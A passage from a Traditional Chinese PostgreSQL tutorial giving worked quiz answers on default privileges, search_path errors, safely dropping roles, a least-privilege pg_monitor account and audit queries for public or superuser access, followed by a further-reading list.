> 驗收方式：`SET ROLE hr_owner; CREATE TABLE app._t(i int);` 之後 `\dp app._t` 應直接看到 `hr_rw=arwd`。
> 見「進階應用 → ALTER DEFAULT PRIVILEGES」與驗收檢查表第 6 項。
>
> **Q6.** ★★★★ 答案是 **(D)**。
> `hr_ro` 是不是 `NOLOGIN` 完全不影響預設權限 —— 它是群組角色，本來就該 `NOLOGIN`，
> 權限透過 `GRANT hr_ro TO rpt_hr;` 的成員關係傳遞給登入角色。
> 另外三個都會真的讓它失效：
> - **(A)** 預設權限只對 `FOR ROLE` 指定的角色**自己建立**的物件生效。
>   若表的擁有者變成 `mig_hr`，`FOR ROLE hr_owner` 那條規則根本不會被觸發。
>   用 `\dt app.*` 看 Owner 欄就能確認。
> - **(B)** `pg_default_acl` 是每個資料庫獨立的，一庫一設，沒有全叢集的寫法。
> - **(C)** 有寫 `IN SCHEMA app` 就只管 `app`；建到 `public` 去的表不吃這條規則
>   （這也是為什麼要把 `public` 的 `CREATE` 收掉，逼大家建在正確的 schema）。
> 見「進階應用 → 四個最常見的失敗點」。
>
> **Q7.** ★★★★ 先查 **`search_path`，不要碰權限**。
> 關鍵判準：權限不足的訊息是 `permission denied for ...`；
> `relation "x" does not exist` 是**物件解析失敗**，代表 PostgreSQL 在 `search_path` 列出的
> schema 裡找不到叫 `orders` 的東西 —— 它甚至還沒進到權限檢查。
> 一分鐘確認法（兩條指令對照）：
> ```bash
> psql "...user=app_hr" -c "SELECT current_schemas(true);"     # 看 app 在不在裡面
> psql "...user=app_hr" -c "SELECT count(*) FROM app.orders;"  # 寫全名試一次
> ```
> 寫全名成功、不寫全名失敗 → 100% 是 search_path。
> 修法：`ALTER ROLE app_hr IN DATABASE hr_app SET search_path = app, public;`
> ★★★★ 改完**要重新連線**才生效，Laravel／PgBouncer 這類握著長連線的必須重啟。
> ★★★ 反過來也要小心：若權限沒給，訊息會是 `permission denied for schema app`，
> 兩者長得完全不同，別混為一談。
> 見「常見錯誤與排錯」第 8 列與排查步驟【7】。
>
> **Q8.** ★★★★ 完整步驟是三段，而且**前兩段要在每一個相關資料庫各做一次**：
> ```bash
> # 【1】轉移它擁有的物件（表、schema、序列…）
> sudo -u postgres psql -d hr_app -c "REASSIGN OWNED BY rpt_hr TO hr_owner;"
> # 【2】清掉「授予給它」的所有權限
> sudo -u postgres psql -d hr_app -c "DROP OWNED BY rpt_hr;"
> # 【3】角色是叢集層級，這步只需一次
> sudo -u postgres psql -c "DROP ROLE rpt_hr;"
> ```
> `DROP OWNED BY` 特別危險的原因：它的名字讓人以為只刪「擁有的物件」，
> 但在 `REASSIGN OWNED BY` 之後，它實際做的是**移除授予該角色的所有權限**，
> 而且**如果你順序寫反**（先 `DROP OWNED BY` 再 `REASSIGN`），
> 它會直接**刪掉該角色擁有的表與資料**，且不可逆、沒有二次確認。
> ★★★★ 所以正式環境的鐵律是：`pg_dump` 先做完，再 `REASSIGN`，最後才 `DROP OWNED`。
> 要找出它在哪些庫還有殘留，用「撤銷、變更與刪除角色」那段的迴圈腳本掃一遍。
> 見「進階應用 → 撤銷、變更與刪除角色」與速查表「角色管理」最後一列。
>
> **Q9.** ★★★★ 正確做法是 **`pg_monitor`**：
> ```sql
> CREATE ROLE mon_exporter LOGIN CONNECTION LIMIT 5;
> GRANT pg_monitor TO mon_exporter;
> ALTER ROLE mon_exporter SET statement_timeout = '10s';
> ```
> `pg_monitor` 本身是 `pg_read_all_settings` + `pg_read_all_stats` + `pg_stat_scan_tables`
> 三者的集合，剛好涵蓋 exporter 需要的全部：完整的 `pg_stat_activity`（含 query 欄）、
> 所有組態參數、以及會取 ACCESS SHARE 鎖的監控函式。
> superuser 會多出來的三種你**不想給**的能力：
> 1. **`COPY ... TO/FROM PROGRAM`** —— 在伺服器上執行任意指令，等於交出 shell；
> 2. **繞過 RLS 與所有物件權限** —— 監控帳號從此看得到全部個資，稽核上站不住腳；
> 3. **`ALTER SYSTEM` 改組態、建／刪任何角色** —— 一個被打穿的 exporter 就能製造後門。
> ★★★ 另外 exporter 帳號記得設 `CONNECTION LIMIT` 與 `statement_timeout`，
> 監控查詢卡住把連線吃光是很常見的事故。
> 見「進階應用 → 預定義角色」與「安全性注意事項」第一則 danger。
>
> **Q10.** ★★★★ 三條查詢，缺一不可：
> ```sql
> -- 【1】表層 ACL：確認沒有 PUBLIC（等號開頭那一段）
> SELECT relacl FROM pg_class WHERE oid = 'app.staff'::regclass;
> --   預期：{hr_owner=arwdDxt/hr_owner,hr_rw=arwd/hr_owner}
> --   ★★★★★ 只要出現以 "=" 開頭的元素（如 =r/hr_owner），就是【對所有人開放】= 資安缺失
>
> -- 【2】欄位層 ACL：確認 id_no / addr 沒被授出去
> SELECT grantee, column_name, privilege_type
> FROM information_schema.column_privileges
> WHERE table_schema='app' AND table_name='staff' ORDER BY 1,2;
> --   預期：只有 id / name / dept / hire_date，不含 id_no、addr
>
> -- 【3】誰有 BYPASSRLS 或 SUPERUSER（他們無視上面兩條）
> SELECT rolname, rolsuper, rolbypassrls FROM pg_roles WHERE rolsuper OR rolbypassrls;
> --   預期：只有 postgres 一列
> ```
> ★★★★★ **第 1 條若出現 `=` 開頭的 ACL，就是明確的資安缺失** ——
> 它代表這個資料庫裡任何能登入的角色（含未來新增的廠商帳號、監控帳號、忘了刪的測試帳號）
> 都能讀到身分證號，構成個資法上「未依規定採取適當安全維護措施」。
> 第 3 條若多出一列，則代表前兩條的防護都可以被那個角色整個繞過，
> 佐證必須連同「為什麼這個角色需要 superuser」的簽核文件一起提出。
> ★★★ 建議把這三條做成每季排程，輸出 CSV 存檔當佐證。
> 見「安全性注意事項 → 機關情境的五個要求」與速查表「診斷查詢」。

---

## 延伸閱讀

- [[04-PostgreSQL-設定檔與pg_hba]] —— 本篇的「第 ① 關」在那裡：`pg_hba.conf` 的**比對順序**、`trust` / `peer` / `scram-sha-256` 的差別、改完該 reload 還是 restart
- [[01-PostgreSQL-安裝與初始化]] —— `postgres` 系統帳號與 `postgres` 資料庫角色的關係，以及 `initdb` 時就決定的 `password_encryption`
- [[03-psql-操作與常用指令]] —— `\dp` `\ddp` `\drg` `\dn+` 的完整用法與輸出格式
- [[08-PostgreSQL-安全強化]] —— RLS（本篇的「第 ⑥ 關」）、強制 SSL、稽核日誌，以及個資遮蔽的完整做法
- [[05-PostgreSQL-備份與還原]] —— `bak_hr` 角色的實際用法、**PITR**，以及「備份帳號少權限導致備份不完整」的還原演練
- [[07-PostgreSQL-複寫與高可用]] —— `REPLICATION` 屬性為什麼等同於「可以整份複製資料庫出去」
- [[02-MySQL-使用者與權限]] —— 同一件事在 MySQL 怎麼做；兩篇對照著讀，兩套系統的模型差異會非常清楚
- [[03-SQL基礎操作]] —— 本篇盤點查詢用到的 `JOIN` / `string_agg` / `array_to_string` 語法
- [[03-範例-Nuxt與PostgreSQL]] —— 本篇建立的 `app_hr` / `mig_hr` 在實際部署裡怎麼寫進 `.env` 與 CI
- [[04-Laravel-Eloquent與資料庫]] —— Laravel 的連線設定、migration 與本篇 `SET ROLE` 策略的接點
- [[02-密碼與帳號管理實務]] —— 機關的密碼原則、離職與異動的帳號清理流程
- [[07-台灣資安法規與個資法]] —— 欄位層授權與 RLS 對應到的法規義務
- [[09-資安稽核與符合性檢核]] —— 本篇的盤點查詢輸出要怎麼整理成稽核佐證
- PostgreSQL 17 權限總覽（含 ACL 字母對照表）：<https://www.postgresql.org/docs/17/ddl-priv.html>
- PostgreSQL 17 預定義角色：<https://www.postgresql.org/docs/17/predefined-roles.html>
- `ALTER DEFAULT PRIVILEGES` 語法與限制：<https://www.postgresql.org/docs/17/sql-alterdefaultprivileges.html>
- `CREATE ROLE` 屬性完整說明：<https://www.postgresql.org/docs/17/sql-createrole.html>
- PostgreSQL 16 Release Notes（`CREATEROLE` 與 `GRANT ... WITH INHERIT/SET` 的變更）：<https://www.postgresql.org/docs/release/16.0/>
